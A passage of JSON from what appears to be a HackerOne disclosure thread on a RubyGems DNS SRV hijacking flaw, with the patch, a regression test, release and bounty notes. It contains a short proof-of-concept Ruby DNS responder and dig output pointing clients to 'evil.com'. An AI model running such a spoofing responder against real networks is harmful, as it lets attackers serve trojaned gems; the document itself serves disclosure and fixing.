a/test/rubygems/test_gem_remote_fetcher.rb\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/test/rubygems/test_gem_remote_fetcher.rb\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -241,6 +241,21 @@\u003c/span\u003e PeIQQkFng2VVot/WAQbv3ePqWq07g1BBcwIBAg==\n     dns.verify\n   end\n\n+  def test_api_endpoint_ignores_trans_domain_values_that_end_with_original_in_path\n\u003cspan class=\"gi\"\u003e+    uri = URI.parse \u0026quot;http://example.com/foo\u0026quot;\n+    target = MiniTest::Mock.new\n+    target.expect :target, \u0026quot;evil.com/a.example.com\u0026quot;\n+\n+    dns = MiniTest::Mock.new\n+    dns.expect :getresource, target, [String, Object]\n+\n+    fetch = Gem::RemoteFetcher.new nil, dns\n+    assert_equal URI.parse(\u0026quot;http://example.com/foo\u0026quot;), fetch.api_endpoint(uri)\n+\n+    target.verify\n+    dns.verify\n+  end\n+\n\u003c/span\u003e   def test_api_endpoint_timeout_warning\n     uri = URI.parse \u0026quot;http://gems.example.com/foo\u0026quot;\n\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2017-05-01T17:21:59.685Z","updated_at":"2017-05-01T17:21:59.685Z","actor":{"username":"segiddins","cleared":false,"url":"/segiddins","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1646895,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This is the proposed patch atop v2.6.12\n\n```patch\nFrom 16d44ce98a2a26bd02b35d1fe49056a1e7a865da Mon Sep 17 00:00:00 2001\nFrom: Samuel Giddins \u003csegiddins@segiddins.me\u003e\nDate: Mon, 1 May 2017 12:41:29 -0500\nSubject: [PATCH] [RemoteFetcher] Avoid DNS Hijacking Vulnerability\n\nReported by @claudijd\n\n**Description:**\n\nThe RubyGems client supports a gem server API discovery functionality,\nwhich is used when pushing or pulling gems to a gem distribution/hosting\nserver, like RubyGems.org.  This functionality is provided via a SRV DNS\nrequest to the users gem source hostname prepended with \"_rubygems._tcp.\".\nThe response to this request tells the RubyGems client (aka: the gem\ncommand) where the users gem server API is.  In the default RubyGems\nscenario, with a gem source of https://rubygems.org, the users SRV DNS\nrequest and reply will look like this:\n\n    ~ $ dig srv _rubygems._tcp.rubygems.org +short\n    0 1 80 api.rubygems.org.\n\nDue to a deficiency in DNS response verification, a MiTM positioned\nattacker can poison the DNS response to this record response and force\nthe client to unknowingly download and install Ruby gems from an attacker\ncontrolled gem server in an alternate security domain.  An example of\nsuch a scenario would look like so:\n\n    ~ $ dig _rubygems._tcp.rubygems.org SRV +short\n    0 0 53 evil.com/api.rubygems.com.\n\nIn such a scenario, the attacker is able to serve the client malicious gem\ncontent, resulting in trivial remote code execution scenarios.  For\nexample, the attacker could simply modify the gem source code and trigger\ncode execution via the extensions API at install time on the client machine\n(a gem trojaning technique described by Ben Smith in his \"Hacking with\nGems\" presentation at Aloha Ruby Conference in 2012 -\nhttps://www.youtube.com/watch?v=z-5bO0Q1J9s)/\n\nThis vulnerability has the same net effect/impact as [CVE-2015-3900](https://nvd.nist.gov/vuln/detail/CVE-2015-3900) and\n[CVE-2015-4020](https://nvd.nist.gov/vuln/detail/CVE-2015-4020).\n\n**Affected method in Gem::RemoteFetcher:**\n\nhttps://github.com/rubygems/rubygems/blob/5096fa35c1ca3e0a7d175aaf9d77cd93114fd977/lib/rubygems/remote_fetcher.rb#L101-L119\n\n**PoC DNS SRV Responder:**\n\n    #!/usr/bin/env ruby\n    require 'rubydns'\n    require 'rubydns/system'\n    INTERFACES = [\n    \t[:udp, \"0.0.0.0\", 53],\n    \t[:tcp, \"0.0.0.0\", 53]\n    ]\n    Name = Resolv::DNS::Name\n    IN = Resolv::DNS::Resource::IN\n    RubyDNS::run_server(:listen =\u003e INTERFACES) do\n      match(//, IN::SRV) do |transaction|\n        transaction.respond!(0,0,53,\"evil.com/api.rubygems.com\")\n      end\n    end\n\n**Fix:**\n\nBy parsing the returned target as a URI and only matching against the\n`hostname`, we can ensure that only subdomains of the original host\nare redirected to. This way, adding URI-delimiting characters to the\n`target` cannot be used to front-pad the target, creating a\nfalse-positive match.\n---\n lib/rubygems/remote_fetcher.rb           |  2 +-\n test/rubygems/test_gem_remote_fetcher.rb | 15 +++++++++++++++\n 2 files changed, 16 insertions(+), 1 deletion(-)\n\ndiff --git a/lib/rubygems/remote_fetcher.rb b/lib/rubygems/remote_fetcher.rb\nindex e6a13d4b..249d7104 100644\n--- a/lib/rubygems/remote_fetcher.rb\n+++ b/lib/rubygems/remote_fetcher.rb\n@@ -110,7 +110,7 @@ class Gem::RemoteFetcher\n     else\n       target = res.target.to_s.strip\n \n-      if /\\.#{Regexp.quote(host)}\\z/ =~ target\n+      if URI(\"http://\" + target).hostname.end_with?(\".#{host}\")\n         return URI.parse \"#{uri.scheme}://#{target}#{uri.path}\"\n       end\n \ndiff --git a/test/rubygems/test_gem_remote_fetcher.rb b/test/rubygems/test_gem_remote_fetcher.rb\nindex cb994462..fbb7d890 100644\n--- a/test/rubygems/test_gem_remote_fetcher.rb\n+++ b/test/rubygems/test_gem_remote_fetcher.rb\n@@ -241,6 +241,21 @@ PeIQQkFng2VVot/WAQbv3ePqWq07g1BBcwIBAg==\n     dns.verify\n   end\n \n+  def test_api_endpoint_ignores_trans_domain_values_that_end_with_original_in_path\n+    uri = URI.parse \"http://example.com/foo\"\n+    target = MiniTest::Mock.new\n+    target.expect :target, \"evil.com/a.example.com\"\n+\n+    dns = MiniTest::Mock.new\n+    dns.expect :getresource, target, [String, Object]\n+\n+    fetch = Gem::RemoteFetcher.new nil, dns\n+    assert_equal URI.parse(\"http://example.com/foo\"), fetch.api_endpoint(uri)\n+\n+    target.verify\n+    dns.verify\n+  end\n+\n   def test_api_endpoint_timeout_warning\n     uri = URI.parse \"http://gems.example.com/foo\"\n \n-- \n2.11.0\n```","markdown_message":"\u003cp\u003eThis is the proposed patch atop v2.6.12\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight diff\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003eFrom 16d44ce98a2a26bd02b35d1fe49056a1e7a865da Mon Sep 17 00:00:00 2001\nFrom: Samuel Giddins \u0026lt;segiddins@segiddins.me\u0026gt;\nDate: Mon, 1 May 2017 12:41:29 -0500\nSubject: [PATCH] [RemoteFetcher] Avoid DNS Hijacking Vulnerability\n\u003c/span\u003e\nReported by @claudijd\n\n**Description:**\n\nThe RubyGems client supports a gem server API discovery functionality,\n\u003cspan class=\"p\"\u003ewhich is used when pushing or pulling gems to a gem distribution/hosting\nserver, like RubyGems.org.  This functionality is provided via a SRV DNS\nrequest to the users gem source hostname prepended with \u0026quot;_rubygems._tcp.\u0026quot;.\nThe response to this request tells the RubyGems client (aka: the gem\ncommand) where the users gem server API is.  In the default RubyGems\nscenario, with a gem source of https://rubygems.org, the users SRV DNS\nrequest and reply will look like this:\n\u003c/span\u003e\n    ~ $ dig srv _rubygems._tcp.rubygems.org +short\n    0 1 80 api.rubygems.org.\n\nDue to a deficiency in DNS response verification, a MiTM positioned\n\u003cspan class=\"p\"\u003eattacker can poison the DNS response to this record response and force\nthe client to unknowingly download and install Ruby gems from an attacker\ncontrolled gem server in an alternate security domain.  An example of\nsuch a scenario would look like so:\n\u003c/span\u003e\n    ~ $ dig _rubygems._tcp.rubygems.org SRV +short\n    0 0 53 evil.com/api.rubygems.com.\n\nIn such a scenario, the attacker is able to serve the client malicious gem\n\u003cspan class=\"p\"\u003econtent, resulting in trivial remote code execution scenarios.  For\nexample, the attacker could simply modify the gem source code and trigger\ncode execution via the extensions API at install time on the client machine\n\u003c/span\u003e\u003cspan class=\"err\"\u003e(a\u003c/span\u003e gem trojaning technique described by Ben Smith in his \u0026quot;Hacking with\n\u003cspan class=\"p\"\u003eGems\u0026quot; presentation at Aloha Ruby Conference in 2012 -\nhttps://www.youtube.com/watch?v=z-5bO0Q1J9s)/\n\u003c/span\u003e\nThis vulnerability has the same net effect/impact as [CVE-2015-3900](https://nvd.nist.gov/vuln/detail/CVE-2015-3900) and\n\u003cspan class=\"err\"\u003e[CVE-2015-4020](https://nvd.nist.gov/vuln/detail/CVE-2015-4020).\u003c/span\u003e\n\n\u003cspan class=\"err\"\u003e**Affected\u003c/span\u003e method in Gem::RemoteFetcher:**\n\nhttps://github.com/rubygems/rubygems/blob/5096fa35c1ca3e0a7d175aaf9d77cd93114fd977/lib/rubygems/remote_fetcher.rb#L101-L119\n\n**PoC DNS SRV Responder:**\n\n    #!/usr/bin/env ruby\n    require \u0026#39;rubydns\u0026#39;\n    require \u0026#39;rubydns/system\u0026#39;\n    INTERFACES = [\n        [:udp, \u0026quot;0.0.0.0\u0026quot;, 53],\n        [:tcp, \u0026quot;0.0.0.0\u0026quot;, 53]\n    ]\n    Name = Resolv::DNS::Name\n    IN = Resolv::DNS::Resource::IN\n    RubyDNS::run_server(:listen =\u0026gt; INTERFACES) do\n      match(//, IN::SRV) do |transaction|\n        transaction.respond!(0,0,53,\u0026quot;evil.com/api.rubygems.com\u0026quot;)\n      end\n    end\n\n**Fix:**\n\nBy parsing the returned target as a URI and only matching against the\n\u003cspan class=\"err\"\u003e`hostname`,\u003c/span\u003e we can ensure that only subdomains of the original host\n\u003cspan class=\"p\"\u003eare redirected to. This way, adding URI-delimiting characters to the\n\u003c/span\u003e\u003cspan class=\"err\"\u003e`target`\u003c/span\u003e cannot be used to front-pad the target, creating a\n\u003cspan class=\"p\"\u003efalse-positive match.\n---\n\u003c/span\u003e lib/rubygems/remote_fetcher.rb           |  2 +-\n test/rubygems/test_gem_remote_fetcher.rb | 15 +++++++++++++++\n 2 files changed, 16 insertions(+), 1 deletion(-)\n\ndiff --git a/lib/rubygems/remote_fetcher.rb b/lib/rubygems/remote_fetcher.rb\n\u003cspan class=\"gh\"\u003eindex e6a13d4b..249d7104 100644\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/lib/rubygems/remote_fetcher.rb\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/lib/rubygems/remote_fetcher.rb\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -110,7 +110,7 @@\u003c/span\u003e class Gem::RemoteFetcher\n     else\n       target = res.target.to_s.strip\n\n-      if /\\.#{Regexp.quote(host)}\\z/ =~ target\n\u003cspan class=\"gi\"\u003e+      if URI(\u0026quot;http://\u0026quot; + target).hostname.end_with?(\u0026quot;.#{host}\u0026quot;)\n\u003c/span\u003e         return URI.parse \u0026quot;#{uri.scheme}://#{target}#{uri.path}\u0026quot;\n       end\n\ndiff --git a/test/rubygems/test_gem_remote_fetcher.rb b/test/rubygems/test_gem_remote_fetcher.rb\n\u003cspan class=\"gh\"\u003eindex cb994462..fbb7d890 100644\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/test/rubygems/test_gem_remote_fetcher.rb\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/test/rubygems/test_gem_remote_fetcher.rb\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -241,6 +241,21 @@\u003c/span\u003e PeIQQkFng2VVot/WAQbv3ePqWq07g1BBcwIBAg==\n     dns.verify\n   end\n\n+  def test_api_endpoint_ignores_trans_domain_values_that_end_with_original_in_path\n\u003cspan class=\"gi\"\u003e+    uri = URI.parse \u0026quot;http://example.com/foo\u0026quot;\n+    target = MiniTest::Mock.new\n+    target.expect :target, \u0026quot;evil.com/a.example.com\u0026quot;\n+\n+    dns = MiniTest::Mock.new\n+    dns.expect :getresource, target, [String, Object]\n+\n+    fetch = Gem::RemoteFetcher.new nil, dns\n+    assert_equal URI.parse(\u0026quot;http://example.com/foo\u0026quot;), fetch.api_endpoint(uri)\n+\n+    target.verify\n+    dns.verify\n+  end\n+\n\u003c/span\u003e   def test_api_endpoint_timeout_warning\n     uri = URI.parse \u0026quot;http://gems.example.com/foo\u0026quot;\n\n-- \n\u003cspan class=\"p\"\u003e2.11.0\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2017-05-01T17:45:32.466Z","updated_at":"2017-05-01T17:45:32.466Z","actor":{"username":"segiddins","cleared":false,"url":"/segiddins","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1651572,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@segiddins my apologies, I would have totally written the patch and tests for this based on our prior discussion.  I've reviewed the patch you've created and believe it's sufficient to address this issue.  In the future, for security related issues, would you prefer I send a PR or is including the patch diff here the preferred medium?","markdown_message":"\u003cp\u003e\u003ca href=\"/segiddins\"\u003e@segiddins\u003c/a\u003e my apologies, I would have totally written the patch and tests for this based on our prior discussion.  I\u0026#39;ve reviewed the patch you\u0026#39;ve created and believe it\u0026#39;s sufficient to address this issue.  In the future, for security related issues, would you prefer I send a PR or is including the patch diff here the preferred medium?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-03T14:59:33.364Z","updated_at":"2017-05-03T14:59:33.364Z","actor":{"username":"claudijd","cleared":false,"url":"/claudijd","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/131/3c373767fbd4f34648ab754b0f692fb718bfb8e5_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1651832,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey, I'm sorry if I came across a bit short earlier. We really appreciate you reporting the vulnerability and working with us to understand the problem and tease out a fix. There's no need for you to write patches for things you report (unless you want to!, and in which case I think a patch shared here is preferable), but since RubyGems is an open-source project that gets very little of my paid time (from RubyTogether) and is otherwise entirely volunteer-driven, estimating when undeveloped work will ship is next to impossible.\n\nAs soon as another RubyGems maintainer reviews the patch, I'll release it. I think we just want to minimize the amount of time a patch is sitting on GitHub for vulnerabilities, particularly with tests that demonstrate how to exploit them. I hope this all is sensible, I'm still getting the hang of being responsible for security issues.","markdown_message":"\u003cp\u003eHey, I\u0026#39;m sorry if I came across a bit short earlier. We really appreciate you reporting the vulnerability and working with us to understand the problem and tease out a fix. There\u0026#39;s no need for you to write patches for things you report (unless you want to!, and in which case I think a patch shared here is preferable), but since RubyGems is an open-source project that gets very little of my paid time (from RubyTogether) and is otherwise entirely volunteer-driven, estimating when undeveloped work will ship is next to impossible.\u003c/p\u003e\n\n\u003cp\u003eAs soon as another RubyGems maintainer reviews the patch, I\u0026#39;ll release it. I think we just want to minimize the amount of time a patch is sitting on GitHub for vulnerabilities, particularly with tests that demonstrate how to exploit them. I hope this all is sensible, I\u0026#39;m still getting the hang of being responsible for security issues.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-03T16:29:55.782Z","updated_at":"2017-05-03T16:29:55.782Z","actor":{"username":"segiddins","cleared":false,"url":"/segiddins","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1652178,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"All sounds sensible to me.  Also, I'm totally willing and able to write patches for bugs I find in the future.","markdown_message":"\u003cp\u003eAll sounds sensible to me.  Also, I\u0026#39;m totally willing and able to write patches for bugs I find in the future.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-03T18:59:45.930Z","updated_at":"2017-05-03T18:59:45.930Z","actor":{"username":"claudijd","cleared":false,"url":"/claudijd","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/131/3c373767fbd4f34648ab754b0f692fb718bfb8e5_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1807335,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The fix will be released as soon as we can get some other fixes in order.","markdown_message":"\u003cp\u003eThe fix will be released as soon as we can get some other fixes in order.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-07-05T14:47:41.379Z","updated_at":"2017-07-05T14:47:41.379Z","actor":{"username":"segiddins","cleared":false,"url":"/segiddins","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1808621,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@segiddins thanks for the update, hope all is good!","markdown_message":"\u003cp\u003e\u003ca href=\"/segiddins\"\u003e@segiddins\u003c/a\u003e thanks for the update, hope all is good!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-07-05T19:32:10.693Z","updated_at":"2017-07-05T19:32:10.693Z","actor":{"username":"claudijd","cleared":false,"url":"/claudijd","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/131/3c373767fbd4f34648ab754b0f692fb718bfb8e5_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1939064,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@segiddins how's it going? Just checking in to see if there is anything I can do to help move this along to release to protect RubyGems end users.","markdown_message":"\u003cp\u003e\u003ca href=\"/segiddins\"\u003e@segiddins\u003c/a\u003e how\u0026#39;s it going? Just checking in to see if there is anything I can do to help move this along to release to protect RubyGems end users.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-18T14:45:33.954Z","updated_at":"2017-08-18T14:46:12.927Z","actor":{"username":"claudijd","cleared":false,"url":"/claudijd","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/131/3c373767fbd4f34648ab754b0f692fb718bfb8e5_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1958763,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Released in http://blog.rubygems.org/2017/08/27/2.6.13-released.html","markdown_message":"\u003cp\u003eReleased in \u003ca title=\"http://blog.rubygems.org/2017/08/27/2.6.13-released.html\" href=\"/redirect?url=http%3A%2F%2Fblog.rubygems.org%2F2017%2F08%2F27%2F2.6.13-released.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://blog.rubygems.org/2017/08/27/2.6.13-released.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-28T02:07:45.197Z","updated_at":"2017-08-28T02:07:45.197Z","actor":{"username":"segiddins","cleared":false,"url":"/segiddins","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"claudijd","url":"/claudijd"},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1958765,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2017-08-28T02:08:27.449Z","updated_at":"2017-08-28T02:08:27.449Z","additional_data":{"duplicate_report_id":243005},"actor":{"username":"mame","cleared":false,"url":"/mame","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1959679,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Can this report be made public?","markdown_message":"\u003cp\u003eCan this report be made public?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-28T13:24:27.606Z","updated_at":"2017-08-28T13:24:27.606Z","actor":{"username":"claudijd","cleared":false,"url":"/claudijd","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/131/3c373767fbd4f34648ab754b0f692fb718bfb8e5_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1959748,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Can I also be CC'd on the duplicate bug?","markdown_message":"\u003cp\u003eCan I also be CC\u0026#39;d on the duplicate bug?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-28T13:50:11.207Z","updated_at":"2017-08-28T13:50:11.207Z","actor":{"username":"claudijd","cleared":false,"url":"/claudijd","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/131/3c373767fbd4f34648ab754b0f692fb718bfb8e5_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1960045,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"\u003e Can this report be made public?\n\nSure\n\n\u003e Can I also be CC'd on the duplicate bug?\n\nI have no idea how to do that\n","markdown_message":"\u003cblockquote\u003e\n\u003cp\u003eCan this report be made public?\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eSure\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eCan I also be CC\u0026#39;d on the duplicate bug?\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eI have no idea how to do that\u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-28T14:41:32.393Z","updated_at":"2017-08-28T14:41:32.393Z","actor":{"username":"segiddins","cleared":false,"url":"/segiddins","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1960606,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-08-28T16:41:24.228Z","updated_at":"2017-08-28T16:41:24.228Z","first_to_agree":true,"actor":{"username":"segiddins","cleared":false,"url":"/segiddins","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1967703,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@claudijd I have CCed you on the duplicate bug.","markdown_message":"\u003cp\u003e\u003ca href=\"/claudijd\"\u003e@claudijd\u003c/a\u003e I have CCed you on the duplicate bug.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-30T23:31:41.700Z","updated_at":"2017-08-30T23:31:41.700Z","actor":{"username":"indirect","cleared":false,"url":"/indirect","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/097/577/4bb4cd3c39360f43b5fd7df0ae2f35e514826e42_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1967704,"is_internal":false,"editable":false,"type":"Activities::CveIdAdded","message":"","markdown_message":"","automated_response":false,"created_at":"2017-08-30T23:32:01.667Z","updated_at":"2017-08-30T23:32:01.667Z","cve_ids":["CVE-2017-0902"],"actor":{"username":"indirect","cleared":false,"url":"/indirect","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/097/577/4bb4cd3c39360f43b5fd7df0ae2f35e514826e42_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1967709,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thank you for your report! Based on the [guidelines posted on the RubyGems HackerOne project](https://hackerone.com/rubygems), this report is considered medium impact: allows remote code execution, but does not guarantee it. Therefore, we are awarding a bounty of $1000.","markdown_message":"\u003cp\u003eThank you for your report! Based on the \u003ca href=\"https://hackerone.com/rubygems\"\u003eguidelines posted on the RubyGems HackerOne project\u003c/a\u003e, this report is considered medium impact: allows remote code execution, but does not guarantee it. Therefore, we are awarding a bounty of $1000.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-30T23:35:57.719Z","updated_at":"2017-08-30T23:35:57.719Z","actor":{"url":"/rubygems","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/212/e65eca09896d23bc029c08d3147a79a48ec1ee2f_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"RubyGems"}},"bounty_amount":"1000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"rubygems","collaborator":{"username":"claudijd","url":"/claudijd"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1967710,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"Disclosing, as requested by reporter.","markdown_message":"\u003cp\u003eDisclosing, as requested by reporter.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-30T23:36:42.952Z","updated_at":"2017-08-30T23:36:42.952Z","actor":{"username":"indirect","cleared":false,"url":"/indirect","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/097/577/4bb4cd3c39360f43b5fd7df0ae2f35e514826e42_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}